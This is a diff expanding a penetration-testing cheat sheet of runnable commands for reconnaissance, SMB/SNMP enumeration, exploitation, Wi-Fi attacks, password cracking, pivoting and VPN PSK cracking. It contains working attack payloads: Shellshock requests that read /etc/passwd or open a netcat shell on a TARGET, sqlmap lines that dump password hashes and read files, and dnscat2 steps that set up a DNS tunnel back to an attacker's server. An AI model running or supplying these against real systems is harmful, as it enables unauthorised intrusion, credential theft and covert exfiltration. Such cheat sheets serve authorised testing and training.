@@ -1,25 +1,121 @@
-Reconn
-		https://dnsdumpster.com
-		https://pentest-tools.com/home
-		https://searchdns.netcraft.com
-		https://www.pkey.in/tools-i/search-subdomains
-		https://cloudpiercer.org
-		https://censys.io
-		https://shodan.io
+OSINT
+	Whois
+		whois domain-name-here.com 
+	DNS IP Lookup
+		dig a domain-name-here.com @nameserver 
+	MX Record Lookup
+		dig mx domain-name-here.com @nameserver
+	Zone Transfer with DIG
+		dig axfr domain-name-here.com @nameserver
+		nslookup -> set type=any -> ls -d blah.com
 
-		https://github.com/TheRook/subbrute
-		https://github.com/rbsec/dnscan
-		https://github.com/aboul3la/Sublist3r
-		https://github.com/guelfoweb/knock
-		https://bitbucket.org/LaNMaSteR53/recon-ng
-		https://tools.kali.org/information-gathering/dnsrecon
+	Email
+		git clone https://github.com/killswitch-GUI/SimplyEmail.git
+		./SimplyEmail.py -all -e TARGET-DOMAIN
+
+	Finger printing
+		nc -v 192.168.1.1 25
+		telnet 192.168.1.1 25
 	
+	Banner grabbing
+		nc TARGET-IP 80
+		GET / HTTP/1.1
+		Host: TARGET-IP
+		User-Agent: Mozilla/5.0
+		Referrer: meh-domain
+		<enter>
+
+Domain permutations
+	https://github.com/netevert/dnsmorph
+	https://github.com/hardwaterhacker/URLCrazy
+
+Domain Reconn
+	dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
+
+	https://pentest-tools.com/home
+	https://searchdns.netcraft.com/
+	https://www.pkey.in/instrumenti-i/poisk-poddomenov
+	https://www.robtex.com/?dns=
+	https://bgp.he.net/
+	https://dnsdumpster.com/
+	http://whois.domaintools.com/
+	https://www.virustotal.com/ru/
+	https://cleantalk.org/blacklists
+	https://bgpview.io/
+	https://www.ripe.net/
+	https://www.shodan.io/
+	https://censys.io/
+	https://www.htbridge.com/radar/?id=rpZVtKLJ
+	https://sandbox.anlyz.io/#!/malware-dashboard
+	https://malwr.com/submission/
+	https://www.reverse.it/
+	https://www.threatcrowd.org/
+	https://mxtoolbox.com/
+	https://statonline.ru/domains?search
+	https://portal.bgpmon.net/firsttimelogin.php
+
+Domain subbrute
+	https://github.com/TheRook/subbrute
+	https://github.com/rbsec/dnscan
+	https://github.com/aboul3la/Sublist3r
+	https://github.com/guelfoweb/knock
+	https://bitbucket.org/LaNMaSteR53/recon-ng
+	https://tools.kali.org/information-gathering/dnsrecon
+	
+Useful
+	https://gchq.github.io/CyberChef/
+	https://regex101.com/
+	http://www.cmd5.ru/
+	https://www.artlebedev.ru/decoder/advanced/
+
+Exploits
+	getsploit by Vulners
+
+	searchsploit –u
+	searchsploit apache 2.2
+	searchsploit "Linux Kernel"
+	searchsploit linux 2.6 | grep -i ubuntu | grep local
+
+	Compiling Windows Exploits on Kali
+		wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
+		wine mingw-get-setup.exe
+		select mingw32-base
+		cd /root/.wine/drive_c/windows
+		wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip
+		cd /root/.wine/drive_c/MinGW/bin
+		wine gcc -o ability.exe /tmp/exploit.c -lwsock32
+		wine ability.exe 
+
+	Cross compiling
+		gcc -m32 -o output32 hello.c (32 bit)
+		gcc -m64 -o output hello.c (64 bit)
+
+	Complile
+		gcc -o exploit exploit.c
+
+	Compile Windows.exe
+		i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
+
+
+ShellShock
+	git clone https://github.com/nccgroup/shocker
+	./shocker.py -H TARGET  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
+
+	echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
+	echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
+	nc -l -p 443
+
+
 SQLmap
 	POST request
 		sqlmap -r request.txt -p param
 
 	sqlmap -u url/searhc.php/?id=1 --dbms
-    sqlmap -u http://url/search/ -D <bd_name> --tables
+	sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3
+	sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords  --file-read="/var/www/blah.php" 
+	sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump
+	sqlmap -o -u "http://meh.com/form/" --forms
+	sqlmap -o -u "http://meh/vuln-form" --forms -D database-name -T users --dump
 
 Wi-Fi
 	MacBook
@@ -38,12 +134,11 @@ Wi-Fi
 	WPS
 		wash -i wlan0mon
 		reaver -i wlan0mon -b [bssid] -vv
-		or
-		reaver -i wlan0mon -b {BSSID of router} -c {router channel} -vvv -K 1 -f
+			or reaver -i wlan0mon -b {BSSID of router} -c {router channel} -vvv -K 1 -f
 	
 	KRACK
 		https://github.com/vanhoefm/krackattacks-scripts
-		apt-get install libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev net-tools git sysfsutils python-scapy python-pycryptodome
+			apt-get install libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev net-tools git sysfsutils python-scapy python-pycryptodome
 
 		Disable hardware encryption
 			./krackattack/disable-hwcrypto.sh.
@@ -84,6 +179,21 @@ Bruteforce
  		nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156
  		use auxiliary/admin/mssql/mssql_enum
 
+Password cracking
+	john --wordlist=/usr/share/wordlists/rockyou.txt hashes
+	john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt
+	john --format=descrypt hash --show
+
+Nmap and UDP port scanner
+	nmap -v -sS -A -T4 target
+	nmap -v -sS -p--A -T4 target
+	nmap -v -sU -sS -p- -A -T4 target
+	nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.1.X
+	
+	git clone https://github.com/portcullislabs/udp-proto-scanner.git
+		./udp-protocol-scanner.pl -f ip.txt 
+		./udp-proto-scanner.pl -p ntp -f ips.txt
+
 Masscan
 	masscan -p22,23,53,445,139,80,443,3389,8080,8443 192.168.1.0/24 --open-only --wait 0 --rate 50000 -oL masscan
 	masscan --port U:161 192.168.1.0/24 --open-only --wait 0 --rate 50000 -oL udp_masscan
@@ -102,24 +212,45 @@ IVRE
     ivre scan2db -r folder
 	
 	Out
-    ivre scancli --openport --port 123 --short
-    ivre scancli --net 10.0.17.0/24 --nmap-xml
-    ivre scancli --net 10.0.19.0/24 --json > 10.0.20.0.json
+	    ivre scancli --openport --port 123 --short
+	    ivre scancli --net 10.0.17.0/24 --nmap-xml
+	    ivre scancli --net 10.0.19.0/24 --json > 10.0.20.0.json
 		
-Web
+Dir bruter
 	dirb http://url.com /usr/share/wordlists/dirb/common.txt
 
+Mounting SMB Shares
+	mount 192.168.1.1:/vol/share /mnt/nfs
+	mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs
+	net use Z: \\win-server\share password /user:domain\janedoe /savecred /p:no
+	apt-get install smb4k -y
+
 SMB enum
+	nbtscan -v -s : 192.168.1.0/24
+	nmblookup -A target
+	smbclient //MOUNT/share -I target -N
+	rpcclient -U "" target
+	enum4linux -a target-ip
+	
+	SMB version
+		smbclient -L //192.168.1.100 
+
+	SMB Users
+		nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 
+		python /usr/share/doc/python-impacket-doc/examples/samrdump.py ip
+
+	Open SMB Shares
+		nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24   
+
 	use auxiliary/scanner/smb/smb_enumshares
 	use auxiliary/scanner/smb/smb_enumusers_domain
-
-	python /usr/share/doc/python-impacket-doc/examples/samrdump.py ip
-	nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24   
-	nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 
 	nmap -v -p 445 --script=smb-check-vulns  192.168.1.0/24
 
-	nbtscan -v -s : 192.168.1.0/24
-	enum4linux -a target-ip
+SMB
+	use auxiliary/scanner/smb/pipe_auditor 
+	use auxiliary/scanner/smb/pipe_dcerpc_auditor
+	use auxiliary/scanner/smb/smb_enumusers
+	use auxiliary/scanner/smb/smb_enumshares
 
 Null session
 	net use \\TARGET\IPC$ "" /u:""
@@ -135,18 +266,17 @@ Null session
     python nullinux.py -shares -U 'Domain\User' -P 'Password1' 192.168.1.0
     python nullinux.py 192.168.1.0/24
 
-SMB
-	use auxiliary/scanner/smb/pipe_auditor 
-	use auxiliary/scanner/smb/pipe_dcerpc_auditor
-	use auxiliary/scanner/smb/smb_enumusers
-	use auxiliary/scanner/smb/smb_enumshares
-
 SNMP enum
+	apt-get install snmp-mibs-downloader download-mibs
+	echo "" > /etc/snmp/snmp.conf
+	
 	snmpcheck -t 192.168.1.X -c public
 	snmpwalk -c public -v1 192.168.1.X 1| grep hrSWRunName| cut -d* * -f 
 	snmpenum -t 192.168.1.X
 	onesixtyone -c names -i hosts
 	smbmap.py -u jsmith -p password1 -d workgroup -H 192.168.0.1
+
+	/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
 
 Spoofing
 	LLMNR / NBT-NS Spoofing
@@ -269,6 +399,82 @@ Some new SSH algorithms
 
 Zmap & Zgrab
 	zmap 172.16.128.0/17 -r 10000 -p 4786 -o - | /root/go/src/github.com/zmap/zgrab/zgrab -timeout=10 -port=4786 -data probe.txt -output-file=banners.json
+
+Zgrab
+	apt-get install zmap
+	wget https://storage.googleapis.com/golang/go1.9.2.linux-amd64.tar.gz
+	tar -C /usr/local -xzf go1.5.3.linux-amd64.tar.gz
+	export PATH=$PATH:/usr/local/go/bin
+	go version
+	export https_proxy=https://arcbot:3128 
+	export http_proxy=http://arcbot:3128
+	go get github.com/zmap/zgrab
+	go build github.com/zmap/zgrab
+
+SSH Tunnel
+	plink.exe -P 22 -l root -pw "1337" -R 445:127.0.0.1:445 REMOTE-IP
+
+SSH Port Forwarding
+	ssh -L 9999:10.0.2.2:445 user@192.168.2.250
+		Port 9999 locally is forwarded to port 445 on 10.0.2.2 through host 192.168.2.250
+	ssh -D 127.0.0.1:9050 root@192.168.2.250
+		Dynamically allows all port forwards to the subnets availble on the target.
+	ssh -L 3389:192.168.2.3:3389 user@192.168.2.2
+	rdesktop 127.0.0.1
+		RDP Port Forwarding
+
+Proxychains
+	proxychains rdesktop TARGET-IP
+
+DNS Tunneling
+	Attacking machine
+		Install
+			apt-get update
+			apt-get -y install ruby-dev git make g++
+			gem install bundler
+			git clone https://github.com/iagox86/dnscat2.git
+			cd dnscat2/server
+			bundle install
+		Run
+			ruby ./dnscat2.rb
+			dnscat2> New session established: 1422
+			dnscat2> session -i 1422
+	Target machine
+		https://downloads.skullsecurity.org/dnscat2/ https://github.com/lukebaggett/dnscat2-powershell/
+		dnscat --host <dnscat server_ip>
+
+SSH Pivoting
+	ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip
+	proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2
+
+Vlan Hopping
+	git clone https://github.com/nccgroup/vlan-hopping.git
+	chmod 700 frogger.sh
+	./frogger.sh 
+
+Scan VPN Servers
+	./udp-protocol-scanner.pl -p ike -f ip.txt
+
+Attack VPN Services
+	pip install pyip
+	git clone https://github.com/SpiderLabs/ikeforce.git
+	./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
+	./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1
+
+	ike-scan
+	ike-scan TARGET-IP
+	ike-scan -A TARGET-IP
+	ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key
+
+IKE Aggressive Mode PSK Cracking
+	Identify VPN Servers
+		./udp-protocol-scanner.pl -p ike SUBNET/24
+	Enumerate with IKEForce to obtain the group ID
+		./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
+	Use ike-scan to capture the PSK hash from the IKE endpoint
+		ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP
+	Use psk-crack to crack the hash
+		psk-crack hash-file.txt
 
 https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation
 
